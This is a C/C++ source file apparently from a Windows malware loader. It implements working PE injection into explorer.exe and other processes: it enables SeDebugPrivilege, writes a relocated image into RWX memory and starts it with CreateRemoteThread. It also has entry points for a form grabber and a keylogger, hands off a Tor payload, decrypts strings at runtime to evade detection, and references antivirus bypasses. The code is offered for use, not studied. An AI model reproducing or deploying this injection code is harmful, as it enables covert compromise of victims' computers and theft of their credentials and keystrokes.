#include <windows.h>

#include <stdio.h>

#include "process_injections.h"
#include "global_config.h"


#include <strsafe.h>

#include "privilege_utils.h"
#include "anti_av_fsecure.h"

#include "debug.h"
#include <mutex>

#include "process_injection_chrome.h"

#include "function_table_core.h"

#include "functions_table.h"
#include "function_table_core.h"

#include "crypto.h"

#include "manager.h"

//#############################################################
// PE injection
// Reference: https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes
//#############################################################

//#############################################################

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

#define COMMON_BUFFER_SIZE 200

//
VOID ReCreateIAT(PIMAGE_DOS_HEADER dos_header, PIMAGE_NT_HEADERS nt_header)
{
	DWORD op;
	DWORD iat_rva;
	SIZE_T iat_size;
	HMODULE import_base;
	PIMAGE_THUNK_DATA thunk;
	PIMAGE_THUNK_DATA fixup;

	PIMAGE_IMPORT_DESCRIPTOR import_table = (PIMAGE_IMPORT_DESCRIPTOR)(nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + (UINT_PTR)dos_header);

	DWORD iat_loc = (nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress) ? IMAGE_DIRECTORY_ENTRY_IAT : IMAGE_DIRECTORY_ENTRY_IMPORT;

	iat_rva = nt_header->OptionalHeader.DataDirectory[iat_loc].VirtualAddress;
	iat_size = nt_header->OptionalHeader.DataDirectory[iat_loc].Size;

	LPVOID iat = (LPVOID)(iat_rva + (UINT_PTR)dos_header);


	// TODO: causes crashing ....
	//l_VirtualProtect(iat, iat_size, PAGE_READWRITE, &op);
	
	while (import_table->Name) {
		import_base = l_LoadLibraryA((LPCSTR)(import_table->Name + (UINT_PTR)dos_header));
		fixup = (PIMAGE_THUNK_DATA)(import_table->FirstThunk + (UINT_PTR)dos_header);



		if (import_table->OriginalFirstThunk) {
			thunk = (PIMAGE_THUNK_DATA)(import_table->OriginalFirstThunk + (UINT_PTR)dos_header);
		}
		else {
			thunk = (PIMAGE_THUNK_DATA)(import_table->FirstThunk + (UINT_PTR)dos_header);
		}

		
		
		while (thunk->u1.Function) {
			PCHAR func_name;
			if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
				fixup->u1.Function =
					(UINT_PTR)l_GetProcAddress(import_base, (LPCSTR)(thunk->u1.Ordinal & 0xFFFF));

			}
			else {
				func_name = (PCHAR)(((PIMAGE_IMPORT_BY_NAME)(thunk->u1.AddressOfData))->Name + (UINT_PTR)dos_header);
				fixup->u1.Function = (UINT_PTR)l_GetProcAddress(import_base, func_name);
			}
			fixup++;
			thunk++;
		}
		import_table++;
	}
	return;
}


// 
DWORD form_grabber_InjectionEntryPoint(PVOID args)
{

	PVOID targetImage = args;

	//
	PIMAGE_DOS_HEADER targetImage_dosHeader = (PIMAGE_DOS_HEADER)targetImage;
	PIMAGE_NT_HEADERS targetImage_ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetImage + targetImage_dosHeader->e_lfanew);

	ReCreateIAT(targetImage_dosHeader, targetImage_ntHeader);

	//
	INJECTION_DEBUG_MESSAGE("form_grabber_InjectionEntryPoint() Started ...\n");

/*
	//
	char * current_binary = (char*)calloc(COMMON_BUFFER_SIZE, 0);
	l_GetModuleFileNameA(NULL, current_binary, COMMON_BUFFER_SIZE);

	char* decrypted_str_1 = NULL;

	decrypt_to_string(&decrypted_str_1, CHROME_EXE_STR, CHROME_EXE_STR_LEN);

	if (strstr(current_binary, decrypted_str_1) != NULL) 
	{
		//
		free(decrypted_str_1);

		//
		INJECTION_DEBUG_MESSAGE("form_grabber_InjectionEntryPoint() - injected into CHROME: %s \n", current_binary);

		char * chrome_version = get_chrome_version(l_GetCurrentProcessId());

		if (chrome_version != NULL) {
			DBG_MSG("form_grabber_InjectionEntryPoint() - chrome_version: %s \n", chrome_version);

			// Do the job of form grabber here.


			//
			free(chrome_version);
			free(current_binary);
			return 0;
		}
		else {
			DBG_MSG("form_grabber_InjectionEntryPoint() - could not find chrome_version.\n");

			free(current_binary);
			return 1;
		}
	}
	
	//
	free(decrypted_str_1);

	// if we not recognize the process.
	INJECTION_DEBUG_MESSAGE("form_grabber_InjectionEntryPoint() - injected into module: %s \n", current_binary);
	
	// last end.
	free(current_binary);
	*/

	return 0;
}

// 
DWORD keylogger_InjectionEntryPoint(PVOID args)
{
	PVOID targetImage = args;

	//
	PIMAGE_DOS_HEADER targetImage_dosHeader = (PIMAGE_DOS_HEADER)targetImage;
	PIMAGE_NT_HEADERS targetImage_ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetImage + targetImage_dosHeader->e_lfanew);

	ReCreateIAT(targetImage_dosHeader, targetImage_ntHeader);

	//
	INJECTION_DEBUG_MESSAGE("keylogger_InjectionEntryPoint() Started ...\n");

	//
	char* current_binary = (char*)calloc(COMMON_BUFFER_SIZE, 1);
	l_GetModuleFileNameA(NULL, current_binary, COMMON_BUFFER_SIZE);




	// if we not recognize the process.
	INJECTION_DEBUG_MESSAGE("keylogger_InjectionEntryPoint() - injected into module: %s \n", current_binary);



	// last end.
	free(current_binary);
	return 0;
}

//
DWORD manager_worker_thread_function(LPVOID manager_injection_entry_point_params_p)
{
	MANAGER_INJECTION_ENTRY_POINT_PARAMS * manager_injection_entry_point_params;

	manager_injection_entry_point_params = (MANAGER_INJECTION_ENTRY_POINT_PARAMS*)manager_injection_entry_point_params_p;

	PVOID imageBase = manager_injection_entry_point_params->imageBase;

	//
	PIMAGE_DOS_HEADER imageBase_dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS imageBase_ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + imageBase_dosHeader->e_lfanew);

	//
	INJECTION_DEBUG_MESSAGE("manager_worker_thread_function() - Started ...\n");
	INJECTION_DEBUG_MESSAGE("manager_worker_thread_function() - manager_injection_entry_point_params->tor_payload_address: 0x%p \n", manager_injection_entry_point_params->tor_payload_address);
	INJECTION_DEBUG_MESSAGE("manager_worker_thread_function() - manager_injection_entry_point_params->tor_payload_len: %d \n", manager_injection_entry_point_params->tor_payload_len);

	// this function will block for the while(1) below. If this function is not blocked, local 'manager' object will get destroyed when the current function exit.
	//manager.init(imageBase, manager_injection_entry_point_params->tor_payload_address, manager_injection_entry_point_params->tor_payload_len);

	//
	manager_init(manager_injection_entry_point_params);
	
	while (1) 
	{
		l_Sleep(6000);
	}
	
	

	//
	return 0;
}

//
//

DWORD manager_InjectionEntryPoint(LPVOID  manager_injection_entry_point_params_p)
{
	MANAGER_INJECTION_ENTRY_POINT_PARAMS * manager_injection_entry_point_params = (MANAGER_INJECTION_ENTRY_POINT_PARAMS*)manager_injection_entry_point_params_p;


	//
	PIMAGE_DOS_HEADER imageBase_dosHeader = (PIMAGE_DOS_HEADER)manager_injection_entry_point_params->imageBase;
	PIMAGE_NT_HEADERS imageBase_ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)manager_injection_entry_point_params->imageBase + imageBase_dosHeader->e_lfanew);

	ReCreateIAT(imageBase_dosHeader, imageBase_ntHeader);

	//
	INJECTION_DEBUG_MESSAGE("manager_InjectionEntryPoint() - Started ...\n");
	DBG_MSG("manager_InjectionEntryPoint() - tor_payload_address: 0x%p \n", manager_injection_entry_point_params->tor_payload_address);
	DBG_MSG("manager_InjectionEntryPoint() - tor_payload_len: %d \n", manager_injection_entry_point_params->tor_payload_len);

	//
	char* current_binary = (char*)calloc(COMMON_BUFFER_SIZE, 1);

	//

	l_GetModuleFileNameA(NULL, current_binary, COMMON_BUFFER_SIZE);

	INJECTION_DEBUG_MESSAGE("manager_InjectionEntryPoint() - injected into module: %s \n", current_binary);

	//
	free(current_binary);


	DWORD main_worker_thread_id = 0;

	//
	HANDLE manager_worker_thread_handle = l_CreateThread
	(
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)manager_worker_thread_function,
		(LPVOID)manager_injection_entry_point_params,
		CREATE_SUSPENDED,
		&main_worker_thread_id
	);

	//
	if (manager_worker_thread_handle == NULL) {
		INJECTION_DEBUG_MESSAGE("manager_InjectionEntryPoint() - CreateThread() 'manager_worker_thread_handle' failed, error code: %d\n", l_GetLastError());
		return 1;
	}
	else {
		INJECTION_DEBUG_MESSAGE("manager_InjectionEntryPoint() - CreateThread() 'manager_worker_thread_handle' success.\n");
	}

	//
	//fsecure_windows_defender_runtime_suspect_apis_call_bypass(&manager_worker_thread_handle, localCopyImage, imageBase_ntHeader->OptionalHeader.SizeOfImage);

	//
	DWORD ret_ResumeThread = l_ResumeThread(manager_worker_thread_handle);

	if (ret_ResumeThread == -1) {
		INJECTION_DEBUG_MESSAGE("manager_InjectionEntryPoint() - ResumeThread() 'manager_worker_thread_handle' failed, error code: %d \n", l_GetLastError());

		return 1;
	}
	else {
		INJECTION_DEBUG_MESSAGE("manager_InjectionEntryPoint() - ResumeThread() 'manager_worker_thread_handle' success.\n");
	}


	//
	INJECTION_DEBUG_MESSAGE("manager_InjectionEntryPoint() - WaitForSingleObject() 'manager_worker_thread_handle' to finish.\n");


	// Do we need to wait ???
	WaitForSingleObject(manager_worker_thread_handle, INFINITE);

	

	return 0;
}

//
/*
1. I do not understand why the call:
VirtualQuery(localCopyImage, &mbi, sizeof MEMORY_BASIC_INFORMATION);

gives me the result not as expected from me.

Is the reason is: it's executed inside a VirtualAlloc() memory zone ?

Because of this, so, this function and its caller takes 2 extra argument: LPVOID localCopyImage, DWORD localCopyImage_size

*/

// Inject from manager_InjectionEntryPoint() in explorer.exe to other processes
bool manager_pe_injection(DWORD target_pid, LPVOID localCopyImage, DWORD localCopyImage_size, int injection_mission)
{
	DBG_MSG("manager_pe_injection() - started. localCopyImage: 0x%p \n", localCopyImage);

	//
	LPVOID imageBase = localCopyImage;

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);


	//
	DBG_MSG("manager_pe_injection() - VirtualAlloc()\n");
	PVOID localImage = l_VirtualAlloc(NULL, localCopyImage_size, MEM_COMMIT, PAGE_READWRITE);

	if (localImage == NULL) {
		DBG_MSG("manager_pe_injection() - VirtualAlloc() failed, code: %d\n", l_GetLastError());
		return false;
	}

	memcpy(localImage, imageBase, localCopyImage_size);

	//
	DBG_MSG("manager_pe_injection() - enable_windows_privilege() - 'SeDebugPrivilege' \n");


	/* TODO: cause crashing.*/

	char* decrypted_str_1 = NULL;

	decrypt_to_string(&decrypted_str_1, SeDebugPrivilege_STR, SeDebugPrivilege_STR_LEN);

	enable_windows_privilege(decrypted_str_1);

	free(decrypted_str_1);


	//
	DBG_MSG("manager_pe_injection() - OpenProcess()\n");
	HANDLE targetProcess = l_OpenProcess(MAXIMUM_ALLOWED, FALSE, target_pid);

	if (targetProcess == NULL) {
		DBG_MSG("manager_pe_injection() - OpenProcess() failed, code: %d\n", l_GetLastError());

		bool ret_VirtualFree = l_VirtualFree(localImage, 0, MEM_RELEASE);

		if (!ret_VirtualFree) {
			DBG_MSG("manager_pe_injection() - VirtualFree() failed, error code: %d \n", l_GetLastError());
		}

		return false;
	}


	//
	DWORD process_exit_code = 0;

	bool get_process_exit_code = l_GetExitCodeProcess(targetProcess, &process_exit_code);

	if (!get_process_exit_code) {
		DBG_MSG("manager_pe_injection() - GetExitCodeProcess() failed, error code: %d. pid: %d. Return now. \n", l_GetLastError(), target_pid);

		bool ret_VirtualFree = l_VirtualFree(localImage, 0, MEM_RELEASE);

		if (!ret_VirtualFree) {
			DBG_MSG("manager_pe_injection() - VirtualFree() failed, error code: %d \n", l_GetLastError());
		}

		return false;
	}

	//
	if (process_exit_code == STILL_ACTIVE) {
		DBG_MSG("manager_pe_injection() - process is STILL_ACTIVE. pid: %d \n", target_pid);
	}
	else {
		DBG_MSG("manager_pe_injection() - process is NOT STILL_ACTIVE. pid: %d. Return now. \n", target_pid);

		bool ret_VirtualFree = l_VirtualFree(localImage, 0, MEM_RELEASE);

		if (!ret_VirtualFree) {
			DBG_MSG("manager_pe_injection() - VirtualFree() failed, error code: %d \n", l_GetLastError());
		}

		return false;
	}

	//
	DBG_MSG("manager_pe_injection() - VirtualAllocEx() on targetProcess\n");
	PVOID targetImage = l_VirtualAllocEx(targetProcess, NULL, localCopyImage_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (targetImage == NULL) {
		DBG_MSG("manager_pe_injection() - VirtualAllocEx() on targetProcess failed, code: %d\n", l_GetLastError());

		bool ret_VirtualFree = l_VirtualFree(localImage, 0, MEM_RELEASE);

		if (!ret_VirtualFree) {
			DBG_MSG("manager_pe_injection() - VirtualFree() failed, error code: %d \n", l_GetLastError());
		}

		return false;
	}

	DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;
	DBG_MSG("manager_pe_injection() - deltaImageBase: %d \n", deltaImageBase);


	PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

	DWORD relocationEntriesCount = 0;
	PDWORD_PTR patchedAddress;
	PBASE_RELOCATION_ENTRY relocationRVA = NULL;

	DBG_MSG("manager_pe_injection() - relocationTable->SizeOfBlock > 0\n");
	while (relocationTable->SizeOfBlock > 0)
	{
		relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);


		DBG_MSG("manager_pe_injection() - relocationTable->VirtualAddress: 0x%p, relocationTable->SizeOfBlock: %d, relocationEntriesCount: %d \n", relocationTable->VirtualAddress, relocationTable->SizeOfBlock, relocationEntriesCount);

		relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);

		for (short i = 0; i < relocationEntriesCount; i++)
		{
			if (relocationRVA[i].Offset)
			{
				patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
				*patchedAddress += deltaImageBase;
			}
		}

		relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
	}


	//
	DBG_MSG("manager_pe_injection() - WriteProcessMemory()\n");
	bool w_ret = l_WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL);

	if (!w_ret) {
		DBG_MSG("manager_pe_injection() - WriteProcessMemory() failed, code: %d\n", l_GetLastError());

		bool ret_VirtualFree = l_VirtualFree(localImage, 0, MEM_RELEASE);

		if (!ret_VirtualFree) {
			DBG_MSG("manager_pe_injection() - VirtualFree() failed, error code: %d \n", l_GetLastError());
		}

		return false;
	}
	else {
		DBG_MSG("manager_pe_injection() - WriteProcessMemory() SUCCESS.\n");
	}

	//
	DBG_MSG("manager_pe_injection() - CreateRemoteThread()\n");


	HANDLE c_ret = NULL;

	if (injection_mission == INJECTION_MISSION_FORM_GRABBER) {
		DBG_MSG("manager_pe_injection() - Calling CreateRemoteThread() for form_grabber_InjectionEntryPoint() \n");
		c_ret = l_CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)form_grabber_InjectionEntryPoint + deltaImageBase), targetImage, 0, NULL);
	}

	else if (injection_mission == INJECTION_MISSION_KEYLOGGER) {
		DBG_MSG("manager_pe_injection() - Calling CreateRemoteThread() for keylogger_InjectionEntryPoint() \n");
		c_ret = l_CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)keylogger_InjectionEntryPoint + deltaImageBase), targetImage, 0, NULL);
	}

	else {
		DBG_MSG("manager_pe_injection() - injection mission %d is unexptected, Return now.\n", injection_mission);
		return false;
	}


	if (c_ret == NULL) {
		DBG_MSG("manager_pe_injection() - CreateRemoteThread() failed, code: %d\n", l_GetLastError());

		bool ret_VirtualFree = l_VirtualFree(localImage, 0, MEM_RELEASE);

		if (!ret_VirtualFree) {
			DBG_MSG("manager_pe_injection() - VirtualFree() failed, error code: %d \n", l_GetLastError());
		}

		return false;
	}
	else {
		DBG_MSG("manager_pe_injection() - CreateRemoteThread() SUCCESS.\n");
	}



	// In real life, we do not do waitting here.
	// DBG_MSG("manager_pe_injection() - WaitForSingleObject() ...\n");
	// l_WaitForSingleObject(c_ret, INFINITE);

	DBG_MSG("manager_pe_injection() - SUCCESS.\n");

	bool ret_VirtualFree = l_VirtualFree(localImage, 0, MEM_RELEASE);

	if (!ret_VirtualFree) {
		DBG_MSG("manager_pe_injection() - VirtualFree() failed, error code: %d \n", l_GetLastError());
	}

	return true;
}

// Inject from main() in our loader to explorer.exe
bool main_pe_injection(DWORD target_pid, LPVOID localCopyImage, DWORD localCopyImage_size, PVOID tor_payload_address, DWORD tor_payload_len)
{
	DBG_MSG("main_pe_injection() - started. localCopyImage: 0x%p \n", localCopyImage);

	//
	LPVOID imageBase = localCopyImage;

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);


	//
	DBG_MSG("main_pe_injection() - VirtualAlloc()\n");
	PVOID localImage = l_VirtualAlloc(NULL, localCopyImage_size, MEM_COMMIT, PAGE_READWRITE);

	if (localImage == NULL) {
		DBG_MSG("main_pe_injection() - VirtualAlloc() failed, code: %d\n", l_GetLastError());
		return false;
	}

	memcpy(localImage, imageBase, localCopyImage_size);

	//
	DBG_MSG("main_pe_injection() - enable_windows_privilege() - 'SeDebugPrivilege' \n");

	char* decrypted_str_1 = NULL;

	decrypt_to_string(&decrypted_str_1, SeDebugPrivilege_STR, SeDebugPrivilege_STR_LEN);

	enable_windows_privilege(decrypted_str_1);

	free(decrypted_str_1);

	//enable_windows_privilege("SeDebugPrivilege");


	//
	DBG_MSG("main_pe_injection() - OpenProcess()\n");
	HANDLE targetProcess = l_OpenProcess(MAXIMUM_ALLOWED, FALSE, target_pid);

	if (targetProcess == NULL) {
		DBG_MSG("main_pe_injection() - OpenProcess() failed, code: %d\n", l_GetLastError());

		bool ret_VirtualFree = l_VirtualFree(localImage, 0, MEM_RELEASE);

		if (!ret_VirtualFree) {
			DBG_MSG("main_pe_injection() - VirtualFree() failed, error code: %d \n", l_GetLastError());
		}

		return false;
	}


	//
	DWORD process_exit_code = 0;

	bool get_process_exit_code = l_GetExitCodeProcess(targetProcess, &process_exit_code);

	if (!get_process_exit_code) {
		DBG_MSG("main_pe_injection() - GetExitCodeProcess() failed, error code: %d. pid: %d. Return now. \n", l_GetLastError(), target_pid);

		bool ret_VirtualFree = l_VirtualFree(localImage, 0, MEM_RELEASE);

		if (!ret_VirtualFree) {
			DBG_MSG("main_pe_injection() - VirtualFree() failed, error code: %d \n", l_GetLastError());
		}

		return false;
	}

	//
	if (process_exit_code == STILL_ACTIVE) {
		DBG_MSG("main_pe_injection() - process is STILL_ACTIVE. pid: %d \n", target_pid);
	}
	else {
		DBG_MSG("main_pe_injection() - process is NOT STILL_ACTIVE. pid: %d. Return now. \n", target_pid);

		bool ret_VirtualFree = l_VirtualFree(localImage, 0, MEM_RELEASE);

		if (!ret_VirtualFree) {
			DBG_MSG("main_pe_injection() - VirtualFree() failed, error code: %d \n", l_GetLastError());
		}

		return false;
	}

	//
	DBG_MSG("main_pe_injection() - VirtualAllocEx() on targetProcess\n");
	PVOID targetImage = l_VirtualAllocEx(targetProcess, NULL, localCopyImage_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (targetImage == NULL) {
		DBG_MSG("main_pe_injection() - VirtualAllocEx() on targetProcess failed, code: %d\n", l_GetLastError());

		bool ret_VirtualFree = l_VirtualFree(localImage, 0, MEM_RELEASE);

		if (!ret_VirtualFree) {
			DBG_MSG("main_pe_injection() - VirtualFree() failed, error code: %d \n", l_GetLastError());
		}

		return false;
	}

	DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;
	DBG_MSG("main_pe_injection() - deltaImageBase: %d \n", deltaImageBase);


	PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

	DWORD relocationEntriesCount = 0;
	PDWORD_PTR patchedAddress;
	PBASE_RELOCATION_ENTRY relocationRVA = NULL;

	DBG_MSG("main_pe_injection() - relocationTable->SizeOfBlock > 0\n");
	while (relocationTable->SizeOfBlock > 0)
	{
		relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);


		DBG_MSG("main_pe_injection() - relocationTable->VirtualAddress: 0x%p, relocationTable->SizeOfBlock: %d, relocationEntriesCount: %d \n", relocationTable->VirtualAddress, relocationTable->SizeOfBlock, relocationEntriesCount);

		relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);

		for (short i = 0; i < relocationEntriesCount; i++)
		{
			if (relocationRVA[i].Offset)
			{
				patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
				*patchedAddress += deltaImageBase;
			}
		}

		relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
	}


	//
	DBG_MSG("main_pe_injection() - WriteProcessMemory()\n");
	bool w_ret = l_WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL);

	if (!w_ret) {
		DBG_MSG("main_pe_injection() - WriteProcessMemory() failed, code: %d\n", l_GetLastError());

		bool ret_VirtualFree = l_VirtualFree(localImage, 0, MEM_RELEASE);

		if (!ret_VirtualFree) {
			DBG_MSG("main_pe_injection() - VirtualFree() failed, error code: %d \n", l_GetLastError());
		}

		return false;
	}
	else {
		DBG_MSG("main_pe_injection() - WriteProcessMemory() SUCCESS.\n");
	}

	//
	DBG_MSG("main_pe_injection() - CreateRemoteThread()\n");

	MANAGER_INJECTION_ENTRY_POINT_PARAMS manager_injection_entry_point_params;

	manager_injection_entry_point_params.imageBase = targetImage;
	manager_injection_entry_point_params.tor_payload_address = tor_payload_address;
	manager_injection_entry_point_params.tor_payload_len = tor_payload_len;

	//
	//
	DBG_MSG("main_pe_injection() - VirtualAllocEx() - tor payload on targetProcess\n");
	PVOID manager_injection_entry_point_params_p = l_VirtualAllocEx(targetProcess, NULL, sizeof MANAGER_INJECTION_ENTRY_POINT_PARAMS, MEM_COMMIT, PAGE_READWRITE);

	if (manager_injection_entry_point_params_p == NULL) {
		DBG_MSG("main_pe_injection() - VirtualAllocEx() on targetProcess failed, code: %d\n", l_GetLastError());

		bool ret_VirtualFree = l_VirtualFree(localImage, 0, MEM_RELEASE);

		if (!ret_VirtualFree) {
			DBG_MSG("main_pe_injection() - VirtualFree() failed, error code: %d \n", l_GetLastError());
		}

		return false;
	}

	//
	DBG_MSG("main_pe_injection() - WriteProcessMemory() - tor payload on targetProcess\n");
	w_ret = l_WriteProcessMemory(targetProcess, manager_injection_entry_point_params_p, &manager_injection_entry_point_params, sizeof MANAGER_INJECTION_ENTRY_POINT_PARAMS, NULL);

	if (!w_ret) {
		DBG_MSG("main_pe_injection() - WriteProcessMemory() - tor payload on targetProcess failed, code: %d\n", l_GetLastError());

		bool ret_VirtualFree = l_VirtualFree(localImage, 0, MEM_RELEASE);

		if (!ret_VirtualFree) {
			DBG_MSG("main_pe_injection() - VirtualFree() - tor payload on targetProcess failed, error code: %d \n", l_GetLastError());
		}

		return false;
	}
	else {
		DBG_MSG("main_pe_injection() - WriteProcessMemory() - tor payload on targetProcess SUCCESS.\n");
	}


	//
	HANDLE c_ret = NULL;

	DBG_MSG("main_pe_injection() - Calling CreateRemoteThread() for manager_InjectionEntryPoint() \n");
	c_ret = l_CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)manager_InjectionEntryPoint + deltaImageBase), manager_injection_entry_point_params_p, 0, NULL);

	if (c_ret == NULL) {
		DBG_MSG("main_pe_injection() - CreateRemoteThread() failed, code: %d\n", l_GetLastError());

		bool ret_VirtualFree = l_VirtualFree(localImage, 0, MEM_RELEASE);

		if (!ret_VirtualFree) {
			DBG_MSG("main_pe_injection() - VirtualFree() failed, error code: %d \n", l_GetLastError());
		}

		return false;
	}
	else {
		DBG_MSG("main_pe_injection() - CreateRemoteThread() SUCCESS.\n");
	}



	// In real life, we do not do waitting here.
	//DBG_MSG("main_pe_injection() - WaitForSingleObject() ...\n");
	//l_WaitForSingleObject(c_ret, INFINITE);

	DBG_MSG("main_pe_injection() - SUCCESS.\n");

	bool ret_VirtualFree = l_VirtualFree(localImage, 0, MEM_RELEASE);

	if (!ret_VirtualFree) {
		DBG_MSG("main_pe_injection() - VirtualFree() failed, error code: %d \n", l_GetLastError());
	}

	return true;
}